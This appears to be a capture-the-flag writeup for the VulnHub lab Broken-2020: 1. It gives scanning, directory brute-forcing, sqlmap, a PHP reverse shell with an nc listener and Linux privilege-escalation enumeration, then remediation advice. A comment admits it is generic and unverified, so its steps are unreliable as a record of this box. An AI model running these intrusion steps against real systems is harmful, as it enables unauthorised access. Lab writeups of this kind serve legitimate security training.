# Broken-2020: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Beginner-Intermediate |
| **OS** | Linux |
| **Root Flag** | via misconfigured sudo or SUID binary |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/broken-2020-1,600/) |

<!-- Note: generated from known techniques; verify against live VM -->

## Attack Summary

nmap → HTTP service → web enumeration → exploitation of web vulnerability → initial shell → privilege escalation via sudo/SUID misconfiguration → root

## Methodology

1. Network discovery
2. Web service enumeration
3. Web application exploitation
4. Privilege escalation

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Typical open ports: **22 (SSH)**, **80 (HTTP)**, possibly others.

---

## Step 2: Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
nikto -h http://<TARGET_IP>
```

Identify the web application type and any interesting directories or files.

---

## Step 3: Exploitation

Based on findings from enumeration:

```bash
# If SQLi
sqlmap -u "http://<TARGET_IP>/page?id=1" --dbs --batch

# If file upload vulnerability
# Prepare PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit IP and port, then upload

# Start listener
nc -lvp 4444
```

---

## Step 4: Privilege Escalation

Once shell obtained:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check writable crons
cat /etc/crontab
ls -la /etc/cron*

# Check capabilities
getcap -r / 2>/dev/null
```

Use GTFOBins for any identified sudo or SUID binary to escalate to root.

```bash
cat /root/root.txt
```

---

## Lessons Learned

1. **Web application hardening** — validate and sanitize all user inputs
2. **Least privilege principle** — avoid granting sudo rights to interactive programs
3. **SUID audit** — regularly review and remove unnecessary SUID bits
4. **Service exposure** — expose only necessary services to the network

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Web vulnerability | Apply input validation; use WAF |
| Excessive sudo rights | Review sudoers; apply NOPASSWD only to specific non-interactive commands |
| SUID misconfig | Audit with `find / -perm -u=s`; remove unnecessary SUID bits |
